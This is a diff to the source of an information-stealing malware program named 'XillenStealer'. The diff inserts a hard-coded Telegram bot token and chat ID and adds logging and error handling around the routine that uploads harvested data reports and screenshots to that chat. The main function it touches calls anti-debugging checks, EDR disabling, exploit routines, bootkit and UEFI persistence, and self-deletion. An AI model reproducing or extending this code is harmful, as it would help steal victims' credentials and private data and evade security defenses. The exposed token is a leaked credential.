@@ -2405,8 +2405,8 @@ class SelfModifyingCode:
             return False
 class AdvancedConfig:
     def __init__(self):
-        self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
-        self.TG_CHAT_ID = os.environ.get('TG_CHAT_ID', 'YOUR_CHAT_ID_HERE')
+        self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', '8474305805:AAGGc6Kx0TzkNmDaw2OH6obQX6wNrVuYGC8')
+        self.TG_CHAT_ID = os.environ.get('TG_CHAT_ID', '7368280792')
         self.TELEGRAM_LANGUAGE = "ru"
         self.ENCRYPTION_KEY = Fernet.generate_key()
         self.POLYMORPHIC_SEED = random.randint(1000, 9999)
@@ -3422,8 +3422,7 @@ WantedBy=multi-user.target"""
         except:
             return False
 def log(message):
-    if DEBUG:
-        print(f"[DEBUG] {message}")
+    print(f"[LOG] {message}")  # Всегда выводим в консоль
     with open("debug.log", "a", encoding="utf-8") as f:
         f.write(f"[{datetime.datetime.now()}] {message}\n")
 def send_telegram_report(collected_data, language='ru'):
@@ -3464,15 +3463,32 @@ def send_telegram_report(collected_data, language='ru'):
         except Exception as e:
             log(f"Screenshot error: {str(e)}")
         caption = f"{template['html']}\n\n{template['signature']}"
-        with open(report_path, "rb") as report_file:
-            bot.send_document(config.TG_CHAT_ID, report_file, caption=caption)
+        print(f"[DEBUG] Sending report to Telegram...")
+        print(f"[DEBUG] Bot token: {config.TG_BOT_TOKEN[:10]}...")
+        print(f"[DEBUG] Chat ID: {config.TG_CHAT_ID}")
+        try:
+            with open(report_path, "rb") as report_file:
+                bot.send_document(config.TG_CHAT_ID, report_file, caption=caption)
+            print("[DEBUG] Report sent successfully!")
+        except Exception as e:
+            print(f"[DEBUG] Error sending report: {e}")
+        
         caption = f"{template['txt']}\n\n{template['signature']}"
-        with open(txt_path, "rb") as txt_file:
-            bot.send_document(config.TG_CHAT_ID, txt_file, caption=caption)
+        try:
+            with open(txt_path, "rb") as txt_file:
+                bot.send_document(config.TG_CHAT_ID, txt_file, caption=caption)
+            print("[DEBUG] TXT report sent successfully!")
+        except Exception as e:
+            print(f"[DEBUG] Error sending TXT report: {e}")
+        
         if screenshot_path and os.path.exists(screenshot_path):
             caption = f"{template['screenshot']}\n\n{template['signature']}"
-            with open(screenshot_path, "rb") as photo:
-                bot.send_photo(config.TG_CHAT_ID, photo, caption=caption)
+            try:
+                with open(screenshot_path, "rb") as photo:
+                    bot.send_photo(config.TG_CHAT_ID, photo, caption=caption)
+                print("[DEBUG] Screenshot sent successfully!")
+            except Exception as e:
+                print(f"[DEBUG] Error sending screenshot: {e}")
         os.remove(report_path)
         os.remove(txt_path)
         if screenshot_path and os.path.exists(screenshot_path):
@@ -4689,24 +4705,46 @@ Social Media Tokens: {'Found' if collected_data.get('social_media_tokens') else 
     """
     return txt_content
 def main():
+    print("[DEBUG] Starting XillenStealer...")
+    print(f"[DEBUG] Bot token: {config.TG_BOT_TOKEN[:10]}...")
+    print(f"[DEBUG] Chat ID: {config.TG_CHAT_ID}")
+    
+    log("Starting sleep obfuscation...")
     sleep_obf = SleepObfuscation()
     sleep_obf.obfuscated_sleep(config.SLEEP_BEFORE_START)
+    
+    log("Starting anti-dumping...")
     anti_dumping = AntiDumping()
     anti_dumping.prevent_dumping()
+    
+    log("Starting anti-analysis checks...")
     anti_analysis = AdvancedAntiAnalysis()
     if anti_analysis.check_debugger_hashes():
+        log("Debugger detected! Exiting...")
         sys.exit(0)
     if anti_analysis.detect_memory_analysis():
+        log("Memory analysis detected! Exiting...")
         sys.exit(0)
     if anti_analysis.check_reverse_tools():
+        log("Reverse tools detected! Exiting...")
         sys.exit(0)
+    
+    log("Anti-analysis checks passed!")
     anti_analysis.emulate_legitimate_software()
+    
+    log("Starting AI analysis...")
     ai_analyzer = AIAnalyzer()
     environment_analysis = ai_analyzer.analyze_environment()
+    
+    log("Starting EDR bypass...")
     edr_bypass = EDRBypass()
     edr_bypass.disable_edr()
+    
+    log("Starting zero-day exploits...")
     zero_day_exploiter = ZeroDayExploiter()
     zero_day_exploiter.run_exploits()
+    
+    log("Starting bootkit persistence...")
     bootkit = BootkitPersistence()
     bootkit.infect_boot_sector()
     uefi_persist = UEFIPersistence()
@@ -4836,7 +4874,9 @@ def main():
             os.remove(sys.argv[0])
         except:
             pass
+    log("Data collection completed! Preparing to send to Telegram...")
     telegram_language = getattr(config, 'TELEGRAM_LANGUAGE', 'ru')
+    log(f"Sending report to Telegram in {telegram_language} language...")
     send_telegram_report(collected_data, telegram_language)
     log("Advanced data collection completed")
 if __name__ == "__main__":
